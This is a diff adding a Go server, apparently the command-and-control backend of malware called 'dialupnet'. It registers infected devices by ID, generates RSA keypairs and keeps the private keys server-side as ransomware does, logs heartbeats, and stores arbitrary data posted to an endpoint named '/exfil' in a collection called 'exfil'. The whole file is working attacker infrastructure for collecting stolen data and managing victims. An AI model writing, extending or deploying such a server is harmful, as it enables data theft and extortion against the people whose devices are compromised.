@@ -1,0 +1,138 @@
+/pk
+/exfil
+/hook
+/heartbeat 
+
+
+
+package main
+
+import (
+"crypto/rand"
+"crypto/rsa"
+"crypto/x509"
+"encoding/base64"
+"encoding/pem"
+"log"
+"net/http"
+"time"
+
+"github.com/gin-gonic/gin"
+"go.mongodb.org/mongo-driver/bson"
+"go.mongodb.org/mongo-driver/mongo"
+"go.mongodb.org/mongo-driver/mongo/options"
+"golang.org/x/net/context"
+)
+
+var devices *mongo.Collection
+
+type Device struct {
+DeviceID string `bson:"device_id"`
+PublicKey string `bson:"public_key"`
+PrivateKey string `bson:"private_key"`
+LastSeen time.Time `bson:"last_seen"`
+}
+
+func main() {
+// Mongo init
+ctx := context.Background()
+client, err := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
+if err != nil {
+log.Fatal(err)
+}
+devices = client.Database("dialupnet").Collection("devices")
+
+r := gin.Default()
+r.POST("/pk", handlePK)
+r.POST("/heartbeat", handleHeartbeat)
+r.POST("/exfil", handleExfil)
+
+log.Fatal(r.Run(":8080"))
+}
+
+func handlePK(c *gin.Context) {
+deviceID := c.GetHeader("X-Device-ID")
+if deviceID == "" {
+c.JSON(http.StatusBadRequest, gin.H{"error": "Missing X-Device-ID header"})
+return
+}
+
+// Generate RSA keypair
+privKey, err := rsa.GenerateKey(rand.Reader, 2048)
+if err != nil {
+c.JSON(http.StatusInternalServerError, gin.H{"error": "key generation failed"})
+return
+}
+
+// Encode to PEM
+privPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privKey)})
+pubASN1, _ := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
+pubPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubASN1})
+
+// Store in DB (Base64 to avoid newline issues)
+_, err = devices.UpdateOne(
+c,
+bson.M{"device_id": deviceID},
+bson.M{"$set": Device{
+DeviceID: deviceID,
+PublicKey: base64.StdEncoding.EncodeToString(pubPEM),
+PrivateKey: base64.StdEncoding.EncodeToString(privPEM),
+LastSeen: time.Now(),
+}},
+options.Update().SetUpsert(true),
+)
+if err != nil {
+c.JSON(http.StatusInternalServerError, gin.H{"error": "db write failed"})
+return
+}
+
+c.JSON(http.StatusOK, gin.H{"public_key": string(pubPEM)})
+}
+
+func handleHeartbeat(c *gin.Context) {
+deviceID := c.GetHeader("X-Device-ID")
+if deviceID == "" {
+c.JSON(http.StatusBadRequest, gin.H{"error": "Missing X-Device-ID header"})
+return
+}
+
+_, err := devices.UpdateOne(
+c,
+bson.M{"device_id": deviceID},
+bson.M{"$set": bson.M{"last_seen": time.Now()}},
+)
+if err != nil {
+c.JSON(http.StatusInternalServerError, gin.H{"error": "db update failed"})
+return
+}
+
+c.JSON(http.StatusOK, gin.H{"status": "heartbeat ok"})
+}
+
+func handleExfil(c *gin.Context) {
+deviceID := c.GetHeader("X-Device-ID")
+if deviceID == "" {
+c.JSON(http.StatusBadRequest, gin.H{"error": "Missing X-Device-ID header"})
+return
+}
+
+var payload map[string]interface{}
+if err := c.BindJSON(&payload); err != nil {
+c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
+return
+}
+
+// Store exfil data in separate collection
+exfilColl := devices.Database().Collection("exfil")
+_, err := exfilColl.InsertOne(c, bson.M{
+"device_id": deviceID,
+"data": payload,
+"time": time.Now(),
+})
+if err != nil {
+c.JSON(http.StatusInternalServerError, gin.H{"error": "db insert failed"})
+return
+}
+
+c.JSON(http.StatusOK, gin.H{"status": "data received"})
+}
